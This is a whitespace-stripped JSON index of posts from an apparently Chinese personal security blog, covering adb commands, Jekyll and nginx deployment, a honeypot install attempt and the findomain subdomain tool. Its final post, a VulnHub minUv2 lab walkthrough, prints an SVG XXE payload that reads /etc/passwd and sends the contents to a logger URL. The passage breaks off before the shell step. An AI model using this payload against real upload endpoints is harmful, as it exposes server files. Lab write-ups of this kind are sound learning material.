/#uname-aLinuxlocalhost4.0.9#661SMPPREEMPTMonNov413:15:47CST2019i686GNU/Linux可以发现有熟悉的Linux系统的影子~4.adbshell后缀加入command,不同于3runremoteshellcommand远程运行shell命令。控制台不进入AndriodShell;$adbshelluname-aLinuxlocalhost4.0.9#661SMPPREEMPTMonNov413:15:47CST2019i686GNU/Linux如上，控制台回显信息，但此时还是在pc端控制台，并没有进入安卓控制台。5.adblogcat[]-Viewdevicelog查看设备日志:查看所有日志：$adblogcat---------beginningofmainI/Netd(0):Netd1.0startingE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/default/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/eth0/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/ifb0/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/ifb1/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/lo/accept_ra_rt_table:NosuchfileordirectoryE/Netd(0):Failedtoopen/proc/sys/net/ipv6/conf/sit0/accept_ra_rt_table:NosuchfileordirectoryI/installd(0):installdfiringupI/(0):debuggerd:Apr4201917:10:30过滤日志:$adblogcatE/WifiStateMachineE/WifiStateMachine(509):WifiStateMachineCMD_START_SCANsource-2txSuccessRate=-0.00rxSuccessRate=-0.00targetRoamBSSID=anyRSSI=-55E/WifiStateMachine(509):WifiStateMachineCMD_START_SCANsource-2txSuccessRate=-0.00rxSuccessRate=-0.00targetRoamBSSID=anyRSSI=-55E/WifiStateMachine(509):WifiStateMachineCMD_START_SCANsource-2txSuccessRate=-0.00rxSuccessRate=-0.00targetRoamBSSID=anyRSSI=-55E/WifiStateMachine(509):WifiStateMachineshouldSwitchNetworktxSuccessRate=-0.00rxSuccessRate=-0.00delta999-&gt;999E/WifiStateMachine(509):CMD_AUTO_ROAMsupstateCompletedStatemystateConnectedStatenid=0config\"lgrut25642\"NONEroam=1toanytargetRoamBSSIDanyE/WifiStateMachine(509):AUTO_ROAMnothingtodoE/WifiStateMachine(509):WifiStateMachineCMD_START_SCANsource-2txSuccessRate=-0.00rxSuccessRate=-0.00targetRoamBSSID=anyRSSI=-556.adbinstall[-lrtsd]安装1.apk命令（在pc端，且1.apk为绝对路径）$adbinstall1.apk3480KB/s(54687952bytesin15.344s)pkg:/data/local/tmp/1.apkSuccess7.adbuninstall[-k]-removethisapppackagefromthedevice('-k'meanskeepthedataandcachedirectories)$adbuninstall[-k]com.com.pack\tSuccess\t-k参数值保存安装数据和缓存。8.adbhelp-showthishelpmessage;显示帮助信息9.adbversion-showversionnum;显示版本号————————华丽分割线——————————以上,记录。"
  },

  {
    "title"    : "多子域：JEKYLL优雅地部署于NGINX",
    "category" : "",
    "tags"     : "Web, 技巧",
    "url"      : "/blog/2019/nginx-with-jekyll-site/",
    "date"     : "Nov 22, 2019",
    "content"  : "本文主要介绍服务端的Jekyll站点部署方法，以及相关的一揽子问题及解决方案；于2021年6月27日星期日20时19分07秒CST修改，个人建议优雅地使用：阐述Jekyll的工作问题；解决多子域问题：nginx配置文件，使得nginx文件配置更加容易移植、运维….解决Web代码更新问题：GitXB4xinSynchronize使用nginx作为jekyll博客的服务启动容器介绍：零：Jekyll如何工作首先先从用户角度解释一下我理解中的jekyll服务的运行原理1.编写markdown文档-&gt;2.markdown解析-&gt;3.jekyll运行生成web站点文件所以我们直接去找站点文件夹，把web站点文件夹复制到nginx的根目录下就好了$cd/your-jekyll-web/$ls$cd_post/$vi2019-01-01-your-article-title.markdown$cp_site//var/www/html/-r$nginx-tnginx:theconfigurationfile/etc/nginx/nginx.confsyntaxisoknginx:configurationfile/etc/nginx/nginx.conftestissuccessfulsystemctlstartnginx$curllocalhost测试nginx完毕没有问题，既可以直接启动nginx。然后看一下本地页面，如果出现本地页面就是调试完成了。一：配置Nginx-ServerNginx的使用自不必多说；这里想要传达出的是一些关于如何优雅的来配置Nginx：A子域：$vi/{path/to/nginx/dir}/sites-enabled/Aserver{#listen80default_server;#listen[::]:80default_server;location/{root/{path/to/your/www/dir}/about;indexindex.htmlindex.htm;try_files$uri$uri/=404;}error_page404403500502503504/404.html;location=/404.html{root/{path/to/your/www/dir}/about;}listen443;sslon;server_nameA.domain.com;ssl_certificate/etc/nginx/{path/to/your/cert}/.crt;ssl_certificate_key/etc/nginx/{path/to/your/key}/.key;ssl_session_cacheshared:SSL:1m;ssl_session_timeout5m;ssl_ciphersECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;ssl_prefer_server_cipherson;ssl_protocolsTLSv1TLSv1.1TLSv1.2;}B子域$vi/{path/to/nginx/dir}/sites-enabled/B后，同样配置就好同样测试一下，没问题就可以了，希望你们自己也能动手试试看。以上二：代码更新-B4xinSync#2x01什么是B4xinSynchronize功能基于双端代码同步脚本，让您的git仅是或否Letyourgitonlyyesorno适用场景将本地调试完成的代码拷贝到工作目录（如jekyll、github）；将工作目录的代码push至github仓库或服务端；服务端自动更新git上传代码。#2x02解决方案修改B4xinSynchronize/bash/config/user_config.sh，注意事项：options_project_{i}的值连接符为下划线，{i}自定义dw模式目录需加入gitPath、buildPath，否则会报Invalid，sw模式同理##project:$your_repo_nameoptions_$your_repo_name_{i}=\"your_repo_name\"_${run_mode}_$your_repo_name_gitPath=\"/path/to/your/repo/name\"_${run_mode}_$your_repo_name_buildPath\"/path/to/your/build/project/\"##example:##dwmodeproject0:bin4xin_github_iooptionsoptions_project_0=\"bin4xin_github_io\"_dw_bin4xin_github_io_gitPath=\"/Users/bin4xin/blog/github-code/bin4xin.github.io\"_dw_bin4xin_github_io_buildPath=\"/Users/bin4xin/blog/SENTRYLAB-WWW-WEB/_site\"#swmodeproject4:B4xinSynchronizeoptionsoptions_project_4=\"B4xinSynchronize\"_sw_B4xinSynchronize_gitPath=\"/Users/bin4xin/blog/github-code/B4xinSynchronize\"bash终端命令client端$brewinstallgawk$gitclonehttps://github.com/Bin4xin/B4xinSynchronize.git$cdB4xinSynchronize/bash$bashSclient.sh[dw/sw]●[Info]Areyousure?(y/n):●[Info]Runningmodeis:swmodenowlooksyouhavevarfilesnow!●[Info]Detected[Repo0]:bin4xin_github_io●[Info]Detected[Repo1]:bin4xin_gitee_io●[Info]Detected[Repo2]:sentrylab_tokyo_www●[Info]Detected[Repo3]:sentrylab_tokyo_about●[Info]Detected[Repo4]:B4xinSynchronize●[Info]Detected[Repo5]:sweet_ysoserial●[Info]Detected[Repo6]:Bin4xin●[Info]Detected[Repo7]:bigger_than_bigger●[Info]Detected[Repo8]:Industrial_Control_Wiki_RecordChooseyourReposoption(defaultoption:0)[0/1/..]:4Thisisavalidgitrepository(butthecurrentworkingdirectorymaynotbethetoplevel.Checktheoutputofthegitrev-parsecommandifyoucare)●[Info]DirectlyjumpingtoSynchronizeupdate.../Users/bin4xin/blog/github-code/B4xinSynchronize●[Info]Synchronizeupdateisrunningin/Users/bin4xin/blog/github-code/B4xinSynchronize●[Info]Synchronizeupdateisrunning...[masterbb5fdd0]Tue,18May202123:39:57+0800commitbyB4xinSynchronize.2fileschanged,8insertions(+),8deletions(-)Enumeratingobjects:9,done.Countingobjects:100%(9/9),done.Deltacompressionusingupto8threadsCompressingobjects:100%(5/5),done.Writingobjects:100%(5/5),573bytes|573.00KiB/s,done.Total5(delta4),reused0(delta0),pack-reused0remote:Resolvingdeltas:100%(4/4),completedwith4localobjects.Tohttps://github.com/Bin4xin/B4xinSynchronize.git21314fc..bb5fdd0master-&gt;masterserver端$bashSserver.sh[/path/to/git/workspace/]●运行中...任务进行中:[Crontab定时计划备份][写入Crontab定时计划][执行Crontab定时计划]备份您的当前的Crontab计划执行添加最新的Crontab计划：[==================================================&gt;][备份计划]&gt;&gt;[crontab-l&gt;config/golbal_var.sh.]...●[Info]任务1:[Crontab定时计划备份]----------&gt;DONE.....[写入计划]&gt;&gt;[config/golbal_var.sh]...●[Info]任务2:[写入Crontab定时计划]----------&gt;DONE.....[执行计划]&lt;&lt;[config/golbal_var.sh]...●[Info]任务3:[执行Crontab定时计划]----------&gt;DONE.....当前最新Crontab计划表为：╔═══════════════════════════════╗║*****gitcheckout-f║╚═══════════════════════════════╝ALLDONE...#2x03其他其他相关介绍可以参考B4xinSynchronize仓库介绍"
  },

  {
    "title"    : "Docker环境下T-pot蜜罐部署记录",
    "category" : "",
    "tags"     : "安全工具, 主动防御",
    "url"      : "/blog/2019/dokcer-t-pot/",
    "date"     : "Nov 21, 2019",
    "content"  : "摘要:最近在网上冲浪看到一个开源蜜罐项目，看到是基于web的蜜罐项目，web页面是真好看。突发奇想正好手头有个公网ip，最近也在为论文数据来源发愁，索性来试试看。先说结论，安装失败。本篇持续更新～（滑稽）看介绍项目的帖子说，最新版T-pot18是基于ubuntuserver18.04TLS进行部署。果断使用docker试试～1.docker安装使用1.1使用apt-get进行安装安装必要的一些系统工具sudoapt-getupdatesudoapt-get-yinstallapt-transport-httpsca-certificatescurlsoftware-properties-common安装GPG证书curl-fsSLhttp://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg|sudoapt-keyadd-写入软件源信息sudoadd-apt-repository\"deb[arch=amd64]http://mirrors.aliyun.com/docker-ce/linux/ubuntu$(lsb_release-cs)stable\"更新并安装Docker-CEsudoapt-get-yupdatesudoapt-get-yinstalldocker-ce2.docker使用语法#查看当前环境下docker拥有的镜像dockerimages#使用宿主机80端口映射且运行ubuntu镜像，镜像使用bash执行dockerrun-it-p80:80ubuntu/bin/bash#保存指令，由于docker不会进行容器修改的保存，所以需要手动保存dockercommit-a\"runoob.com\"-m\"myapache\"a404c6c174a2mymysql:v1#运行保存的容器dockerrun-it-p80:80ubuntu:v13.docker中netselect-apt报错.3.1安装netselect-apt依赖的netselect包安装netselect之前无法安装netselect-apt，会报错。即netselect是必须依赖项安装netselect_0.3.ds1-28+b1_amd64.debwgethttp://ftp.cn.debian.org/debian/pool/main/n/netselect/netselect_0.3.ds1-28+b1_amd64.debdpkg-inetselect_0.3.ds1-28+b1_amd64.deb3.2netselect包安装报错以下两个是本菜docker安装时出现的依赖项，贴出来，基本上就是缺什么装什么就行了。解决\"Can'tlocateTerm/ReadLine.pm\"安装:aptinstalllibterm-readkey-perl-y解决\"Nousabledialog-likeprogramisinstalled\"安装:aptinstalldialog3.3安装netselect-apt包wgethttp://ftp.cn.debian.org/debian/pool/main/n/netselect/netselect-apt_0.3.ds1-28_all.debdpkg-inetselect-apt_0.3.ds1-28_all.deb安装结束应无任何报错，即代表成功；也可以通过输入两个包进行验证。4.安装T-POT蜜罐cdtpotce/iso/install./install.sh--type=auto--conf=tpot.conf#自动编译配置，配置文件为tpot.confcptpot.conf.disttpot.conf#生成配置文件报错Aborting:debianbionicisnotsupport.看样子是系统版本的问题，无法解决。～搞了一下午，脑阔疼。"
  },

  {
    "title"    : "「笔记」：Jekyll for linux.服务器部署历程",
    "category" : "",
    "tags"     : "笔记, 软件移植",
    "url"      : "/blog/2019/jekyll-in-linux/",
    "date"     : "Nov 18, 2019",
    "content"  : "申明：背景图来自微博@胡歌，侵删～不过胡歌这么可爱应该不会介意的第一个问题：这玩意儿是什么？通俗的来讲：Jekyll=webserver+staticblog+frontendUI如果你想拥有一个自己的博客但是苦于数据库没学好，你可以来试试看；再如果想学前端，你也可以试试看～做配置前请默念三遍四者之间的关系，保证倒背如流在进行下一步：1.Ruby是语言。2.gem是一组Ruby程序，类似于「包」的概念。3.RubyGems是Ruby的包管理器，用来管理和安装gems的。4.bundle是用来管理gems的项目，确保能够正确地安装项目依赖，确保能够运行正确的包。1.RVM安装gpg--keyserverhkp://keys.gnupg.net--recv-keys409B6B1796C275462A1703113804BB82D39DC0E3curl-sSLhttps://get.rvm.io|bash-sstable##如果上面秘钥导入失败会提示command建议，直接复制下来，实在不行找不到使用下面这个链接下载。curl-Lhttps://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer|bash-sstablesource/usr/local/rvm/scripts/rvm##配置一次性变量，这里terminal暂时使用一下。熟悉的朋友可以直接配进bashrc自启期间会安装各种依赖包，等待一段时间后出现complete字样即成功安装。2.ruby安装2.1切换rvm源接着就是换源，老外网真的慢--没办法,跟linux换源是一个道理#echo\"ruby_url=https://cache.ruby-china.org/pub/ruby\"&gt;~/.rvm/user/db#此处本菜机子的是.rvmrc，直接把url导入：#echo\"ruby_url=https://cache.ruby-china.org/pub/ruby\"&gt;/root/.rvmrc========================2020-03-31更新：换源文件=================================+==============================================================================+|echo\"ruby_url=https://cache.ruby-china.com/pub/ruby\"&gt;/usr/local/rvm/user/db|+==============================================================================+找不到更新rvm源的文件，如果是按照上面方法，基本是在上面这个文件下。[root@iZ2ze9ebgot9gy5c2mi5ecZuser]#echo\"ruby_url=https://cache.ruby-china.com/pub/ruby\"&gt;/usr/local/rvm/user/db[root@iZ2ze9ebgot9gy5c2mi5ecZuser]#catdbruby_url=https://cache.ruby-china.com/pub/ruby[root@iZ2ze9ebgot9gy5c2mi5ecZuser]#rvminstall\"ruby-2.5.7\"Searchingforbinaryrubies,thismighttakesometime.Nobinaryrubiesavailablefor:centos/7/x86_64/ruby-2.5.7.Continuingwithcompilation.Pleaseread'rvmhelpmount'togetmoreinformationonbinaryrubies.Checkingrequirementsforcentos.Requirementsinstallationsuccessful.InstallingRubyfromsourceto:/usr/local/rvm/rubies/ruby-2.5.7,thismaytakeawhiledependingonyourcpu(s)...ruby-2.5.7-#downloadingruby-2.5.7,thismaytakeawhiledependingonyourconnection...**Resumingtransferfrombyteposition323584%Total%Received%XferdAverageSpeedTimeTimeTimeCurrentDloadUploadTotalSpentLeftSpeed10012.8M10012.8M006097k00:00:020:00:02--:--:--6095kruby-2.5.7-#extractingruby-2.5.7to/usr/local/rvm/src/ruby-2.5.7.....ruby-2.5.7-#configuring...................................................................ruby-2.5.7-#post-configuration..ruby-2.5.7-#compiling..................................................................................ruby-2.5.7-#installing..............................ruby-2.5.7-#makingbinariesexecutable..ruby-2.5.7-#downloadingrubygems-3.0.8%Total%Received%XferdAverageSpeedTimeTimeTimeCurrentDloadUploadTotalSpentLeftSpeed25867k25223k001513800:00:580:00:150:00:4316300ruby-2.5.7-#adjusting#shebangsfor(gemirberbrirdoctestrbrake).Installofruby-2.5.7-#completeRubywasbuiltwithoutdocumentation,tobuilditrun:rvmdocsgenerate-ri基本上看到上面的complete就安装完了#安装rubyrvmlistknow#查询已知rvm软件列表rvminstall“ruby-2.5.5”#安装rubyrvmuse2.5.5#指定使用的ruby版本号3.配置ruby-gems环境#配置前确认：rvm-vrvm1.29.9(latest)byMichalPapis,PiotrKuczynski,WayneE.Seguin[https://rvm.io]gem-v3.0.6ruby-vruby-vruby2.5.5p157(2019-03-15revision67260)[x86_64-linux]gemsource-lgemsources--removehttps://rubygems.org/gemsources-ahttps://gems.ruby-china.com##换源换源换源gemupdate--systemgeminstallbundler4.安装jekyllgeminstalljekyll安装jekyll工具，保证jekyll能顺畅运行。此处跟每个人下载的模板不一样所需要的工具不一样，我这里把基本的一些工具贴上，后期模板不一样看一下环境要求根据要求即可。geminstallbundler#打包用工具geminstalljekyll-paginate#分页设置工具重要一定要安装geminstallminima#默认主题geminstalljekyll-feed#订阅用的工具bundle?%sudobundleexecrakeproduction:export/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229:warning:Insecureworldwritabledir/usr/local/sbininPATH,mode040777fatal:不是一个git仓库（或者任何父目录）：.gitCouldnotfindrake-10.5.0inanyofthesourcesRun`bundleinstall`toinstallmissinggems.到你所在的博客目录下，gitinit：bin4xin@bin4xin'sMacbookProtext-theme%pwd/Users/bin4xin/blog/text-themebin4xin@bin4xin'sMacbookProtext-theme%gitinit已初始化空的Git仓库于/Users/bin4xin/blog/text-theme/.git/%bundleconfigmirror.https://rubygems.orghttps://gems.ruby-china.com/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229:warning:Insecureworldwritabledir/usr/local/sbininPATH,mode040777bin4xin@bin4xin'sMacbookProtext-theme%sudobundleinstall/System/Library/Frameworks/Ruby.framework/Versions/2.6/usr/lib/ruby/2.6.0/universal-darwin19/rbconfig.rb:229:warning:Insecureworldwritabledir/usr/local/sbininPATH,mode040777Don'trunBundlerasroot.Bundlercanaskforsudoifitisneeded,andinstallingyourbundleasrootwillbreakthisapplicationforallnon-rootusersonthismachine.Fetchinggemmetadatafromhttps://gems.ruby-china.com/...........Fetchingrake10.5.0Installingrake10.5.0Fetchingconcurrent-ruby1.1.5Installingconcurrent-ruby1.1.5Fetchingi18n1.7.0Installingi18n1.7.0··省略····Fetchingsassc2.2.1Installingsassc2.2.1withnativeextensionsBundlecomplete!3Gemfiledependencies,42gemsnowinstalled.5.启动服务一般你们都是直接下载了模板，模板解压后进入文件夹即可。比如我这里模板文件夹叫blogunzipblog.zipcdblog/gitinit#如果你有多个模板，记得先用这个命令，把当前文件夹当做根目录；同理使用其他模板第一步输入这个命令jekyllserve-P80#自动构建并运行jekyll服务6.jekyll报错Couldnotfindgem'X'inanyofthegemsourceslistedinyourGemfile.(Bundler::GemNotFound)geminstallX安装即可1.jekyll-paginate使用失败即使是安装了jekyll-paginate，也会报错。gemlist–local|grepjekyll-paginate#查看本地gem安装插件确认安装上，在博客根目录下编辑Gemfile，添加：gem‘jekyll-paginate’,group::jekyll_plugins2.cannotloadsuchfile–kramdown-parser-gfm(LoadError)安装即可。安装kramdown-parser-gfm，不要分开一个一个安装。现在jekyll服务启动后，web的服务是使用WEBrick服务器，会有以下让我觉得不舒服的地方：1）目录遍历2）无法隐藏服务器版本号（也许是能够这样操作但是我没有发现），所以试了下发现nginx也是可以的传送门以上。"
  },

  {
    "title"    : "「起源」：我与ERRORS",
    "category" : "",
    "tags"     : "笔记, 起源",
    "url"      : "/top/2019/first-day/",
    "date"     : "Sep 11, 2019",
    "content"  : "摘要：想自己做个人博客已经不是一天两天了。正好，最近闲了下来，趁着年前有时间，来把这个事情了结掉。（文尾有彩蛋～）我以初中物理的思路简单构思了一下这个站，简称三个W：What+Why+HowWHAT？是什么我其实也一直在纠结，搭建一个这样的博客的意义何在，难道是这样一个刀枪不入的却又孤独的独角戏吗？显然不是，因为这并不是一个没有温度的博客，每篇文章内都倾注了我的心血；同时在我对这些过程进行复现、记录时，对于shellcommand的掌握、理解又进一步加深。所以并不说得上没有意义，我觉得反之，意义非凡；或者等我老了，或许足够幸运，这个站还在，我跟我的孩子们吹牛，我也曾经年轻过、努力过啊，T.T总结：PatrolDiary=Linuxshell+Cloudcomputing+NetworkSecurity+UI(X)WHY？为什么问题很好理解，为什么是这个站？是PatrolDiary，是而不是那个站，不是the？因为她就是PatrolDiary，beaPatrolDiary。一本「斥候」日记，承载着一个本科学生的BigDream斥候专项（PatrolPlan）是我大三暑假构思出来的，起初的构想是做一个扫描器，这个扫描器的主要用途咱不多说～有点中二，总结一下：PatrolScanner=AIscan+Vlan+nmap哈哈哈。所以总体来讲：一个博客的搭建比一个扫描器简单多啦，在我看来:)所以就这，成就了Patrol的起源。HOW？怎样做自己做博客，emmm，我觉得并不是容易的事，因为作为学安全的本菜说实话对这些东西是有些敏感的；像知名的开源博客项目Wordpress、Discuz!等等我都不太喜欢。毕竟玩的第二个靶机就是wordpress的博客站～不是说wordpress这些开源项目不安全怎么怎么样，我们从宏观角度来看，webserver只要与服务器本身产生交互，就是会存在隐患、Vuln，代码是人写的，金无足赤，码无完码啊，这一点我们无法避免。思来想去，确立了下面几个条件：1.个人博客使用默认web端口，但是server不能与其他任何serverd产生交互除了httpd以外；2.常规的安全基线的检查规范，避免低级错误；3.美观、简约、大方。敲定上面的结构，当天晚上就急匆匆上网找项目，哈哈哈当天晚上就找到了满意的开源项目并且本地调试运行了一下，感觉效果很好～不得不佩服我的效率（捂脸）要是毕设能这么高的效率就好了。所以how这个问题也就迎刃而解了：webblog=jekyll+gem+rvm+ruby+nginxjekyll是github的开源项目（极力给大家推荐），UI很漂亮，做了响应式，环境部署完基本是一步更新,但是这些都不是我选她的理由，真正的理由是：她的属性-静态。静若处子，动若脱兔（狗头）##理由：1.jekyll:静态，好看；2-4.依赖项；5.ruby写的WEBrick容器有安全隐患且暂无解决办法：目录遍历+打印版本号终章一旦一个博客网站脱离了数据库，就意味着不会存在安全隐患。所以在我看来，这个站较于动态博客是绝对安全的。所以做这个博客的初衷则在于检验自己的网站加固能力，次要则在于对于知识的沉淀、总结；一切的基础在于此站的安全性为基础论调。就当是自己给自己布置的一个加固项目吧。公元二零二零年九月十一日写于安徽合肥今天也是快乐的一天～申明：背景图来自微博@胡歌，侵删～不过胡歌这么可爱应该不会介意的"
  },

  {
    "title"    : "「移植」Ubuntu With Arm公网存储容器搭建记录",
    "category" : "",
    "tags"     : "软件移植, ARM, 笔记",
    "url"      : "/blog/2019/Ubuntu-linux-with-arm/",
    "date"     : "Sep 1, 2019",
    "content"  : "声明：本文章首发于华为云鲲鹏社区，同步于作者个人博客:)鲲鹏云服务器Ubuntu18.0464bitwithARMPHP+NGINX软链接演示摘要：华为云社区的活动好多～最近领了个ARM云服务器。打算用服务器搭建一个云存储服务容器方便自己上传论文，说干就干，于是就是在网上找了个开源的项目。下载压缩包下来完事，发现没有php环境，得自己配置。行吧，自己配。1.安装nginx网站服务器1.1换源安装web前记得先把源换一下，ubuntu的官方源我也测试了，确实有点慢。注意换源要换成ARM的版本。这个本菜换的源供大家参考。#vi/etc/apt/sources.listdebhttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenialmainmultiverserestricteduniversedebhttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-securitymainmultiverserestricteduniversedebhttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-updatesmainmultiverserestricteduniversedebhttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-backportsmainmultiverserestricteduniversedeb-srchttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenialmainmultiverserestricteduniversedeb-srchttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-securitymainmultiverserestricteduniversedeb-srchttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-updatesmainmultiverserestricteduniversedeb-srchttp://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/xenial-backportsmainmultiverserestricteduniversesudoaptupdate1.2安装sudoaptinstallnginxps-ef|grepnginx#查看进程curllocalhost#本地调试出现welcome页面即本地调试成功如果想要公网访问ip需开放入方向安全规则80端口。找到控制台-入方向规则-添加规则访问公网ip即可。2.安装php、配置nginx解析2.1php安装#sudoaptinstallphp-fpm##这里注意查看一下php-fpm的管理器版本，后面配置软链接如果版本不一致会报错#cd/var/run/php/#lsphp7.0-fpm.pidphp7.0-fpm.sock##可以看到此处本菜的版本是7.02.2最重要的nginx软链接解析进入/etc/nginx/sites-available目录下新建webserver，配置php解析文件。2.3在server区块中配置基本服务server{listen80;##网站监听端口，这里设置为80，即浏览器默认的HTTP端口号。root/var/www/html;##网站根目录indexindex.phpindex.htmlindex.htmindex.nginx-debian.html;##配置web默认页server_nameip##你的公网ip;location/{try_files$uri$uri/=404;}location~\\.php${##如果url输入为php后缀文件则传给php-fpm进行处理。includesnippets/fastcgi-php.conf;fastcgi_passunix:/var/run/php/php7.0-fpm.sock;##注意此处的解析目录的更改}location~/\\.ht{denyall;##该区块禁止.htaccess的访问。}}2.4配置nginx软链接如果报错无法找到webserver(此处每人不同，如果未修改则是default)，进入/etc/nginx/sites-enabled目录下查看软链接配置，删除多余配置，留下default和webserver软链接文件sudoln-s/etc/nginx/sites-available/webserver/etc/nginx/sites-enabled/sudonginx-t#nginx测试，无报错进入下一步sudosystemctlreloadnginx#重启服务，载入最新配置报错解决:/etc/nginx/sites-enabled#lltotal8drwxr-xr-x2rootroot4096Nov1211:03./drwxr-xr-x6rootroot4096Nov1211:34../lrwxrwxrwx1rootroot34Nov1210:51default-&amp;gt;/etc/nginx/sites-available/defaultlrwxrwxrwx1rootroot34Nov1211:02webserver-&amp;gt;/etc/nginx/sites-available/webserverrm-rfwebserversudoln-s/etc/nginx/sites-available/webserver/etc/nginx/sites-enabled/3.测试在web服务目录下创建php文件测试。sudovitest.php&amp;lt;?phpphpinfo();?&gt;使用浏览器输入:{ip.addr}:{ip.port}/test.php；测试成功：4.部署存储容器别忘了我们的最终目的，是部署云服务器容器。将web文件夹解压至web根目录下。访问即可。由于此处使用的是第三方开源容器项目，所以安全性无法保障，不保证后门等情况不会发生，所以介意者可以自行搭建（代码托管平台也有）。为了避免麻烦这里把所有的与项目有关的信息码一下，见谅。好了。基本上一个自己使用的云存储容器就可以投入使用了。手机端、PC端都可以使用。建议大家可以自己尝试一下。么么哒"
  },

  {
    "title"    : "「FINDOMAIN」：跨平台子域名搜集工具",
    "category" : "",
    "tags"     : "安全工具, 笔记",
    "url"      : "/blog/2019/findomain/",
    "date"     : "Sep 1, 2019",
    "content"  : "摘要:之前在暑假里申请注册了个云先知平台账号，平时没事闲（mo）着（yang）的（gong）时候当当土拨鼠挖挖洞。挖过的都懂，是一个类似于渗透测试的中心化平台。乙方公司有这个需求，通过这个平台发放任务，通过不同的漏洞等级【严重】-【高危】-【中危】-【低危】，严重就是危及到服务器权限，能够getwebshell、root甚至横向渗透，依次类推每一项，危及程度依次类推，有兴趣的朋友自行搜索体会（你们可以猜猜xss在哪个位置）。以上背景，每份任务都会规定好一些任务域名，指定好。其他的域名没有备案不允许碰。如：重点就来了，前面的*,是需要我们自己去测试的，也就是说，不同的*会有别样的惊喜。那么这就推出咱们的主角：findomain，跨平台的子域名搜集工具。1.下载安装$gitclonehttps://github.com/Edu4rdSHL/findomain.git$cdfindomain$apt-getinstallcargo$cargobuild--release$sudocptarget/release/findomain/usr/bin$findomain2.语法介绍1、进行简单的子域名搜索，并输出信息：findomain-texample.com2、使用所有的API进行子域名搜索，并输出信息：findomain-texample.com–a3、搜索子域名，并将输出导出为CSV文件格式：findomain-texample.com-ocsv4、使用所有的API进行子域名搜索，并将输出导出为CSV文件格式：findomain-texample.com-a-ocsv3.实际使用$findomain-ta****un.com-ocsv$Target==&gt;a****un.comSearchingintheCertSpotterAPI...SearchingintheBufferoverAPI...SearchingintheCrtshdatabase...SearchingintheVirustotalAPI...SearchingintheSublist3rAPI...SearchingintheFacebookAPI...SearchingintheThreadcrowdAPI...SearchingintheSpyseAPI...Anerror❌hasoccurredwhileparsingtheJSONobtainedfromtheThreadcrowdAPI.Errordescription:JSONerror.Anerror❌hasoccurredwhileparsingtheJSONobtainedfromtheBufferoverAPI.Errordescription:JSONerror.Anerror❌hasoccurredwhileparsingtheJSONobtainedfromtheSublist3rAPI.Errordescription:JSONerror.Atimeout⏳errorhasoccurredwhileprocessingtherequestintheFacebookAPI.Errordescription:timedoutAtotalof`153`subdomainswerefoundfor==&gt;a***un.comGoodluckHax0r!&gt;&gt;Filenameforthetargetaliyun.comwassavedin:./a*****n.com_1680.csv可以看到Atotalof153subdomains.所以使用findomain工具一共搜集到了153个子域名。最后，goodluck。且输出的csv文件就输出在运行工具的当前文件夹下。推荐大家可以试试看,搜集信息还是很好用的，么么哒"
  },

  {
    "title"    : "「渗透」SVG的神秘力量：minUv2",
    "category" : "",
    "tags"     : "Web, 漏洞复现, 渗透, vulnhub",
    "url"      : "/blog/2019/minUv2-walkthrough/",
    "date"     : "Sep 1, 2019",
    "content"  : "categories:blogWeb漏洞复现渗透vulnhub序言hello,各位。最近闲来无事，工作之余偷偷用公司电脑测试入侵了一个linux靶机，遂记录下。（手动狗头）这个靶机本身难度适中，复现了svg的代码执行漏洞且要求对linux的系统命令较为熟悉；svg大体来说是一种图像文件格式，基于XML，由W3C联盟进行开发的，支持网页打开，编辑方便等。可以自行深入搜索~各位大佬见笑。一、靶机简介minUv2下载地址:Download(Mirror)Download(Torrent)二、实战江湖规矩，神器开路：首先先用Nmap扫描确定靶机地址。发现靶机ip。这里靶机只支持vbox，所以得桥接通信，打码请谅解~确定ip直接端口扫描~发现只开放了两个端口：22、3306端口。22端口暂时先放着不管，咱们看看3306端口。是一个web页面，emmmm.主角登场，svg图像~三、发现漏洞小弟赶紧dirb扫描一波，果然有发现。#扫描3306端口下的html后缀的文件dirbhttp://$_ip:port-X.html--------------+http://$_ip:port/upload.html(CODE:200|SIZE:908)--------------DOWNLOADED:4612-FOUND:1发现了上传网页，且只能上传svg、img文件，又惊又喜。exp搜索一哈找到poc，验证一下漏洞的存在。poc代码如下：#poc上传上去页面回显#&lt;!DOCTYPEsvg[&lt;!ELEMENTsvgANY&gt;&lt;!ENTITYxxeSYSTEM\"/etc/passwd\"&gt;]&gt;&lt;svgversion=\"1.0\"xmlns=\"http://www.w3.org/2000/svg\"width=\"19000px\"xmlns:xlink=\"http://www.w3.org/1999/xlink\"&gt;&lt;textx=\"-1000\"y=\"-1000\"&gt;&amp;xxe;&lt;/text&gt;&lt;circlecx=\"50\"cy=\"50\"r=\"40\"stroke=\"black\"stroke-width=\"3\"\t\tfill=\"red\"/&gt;&lt;script&gt;varlogger=\"http://localhost/?file=\"+encodeURIComponent(document.getElementsByTagName(\"text\")\t[0].innerHTML);document.createElementNS('http://www.w3.org/2000/svg','image').setAttributeNS('http://www.w3.org/1999/xlink','href',logger);&lt;/script&gt;&lt;/svg&gt;果然有xxe漏洞，但是验证了漏洞不能让我们有实际的渗透进展，只能对一些文件内容进行查看，无法得到shell，要怎么办呢？四、getshell就在小弟愁眉苦脸的时候，忽然看到最后一行用户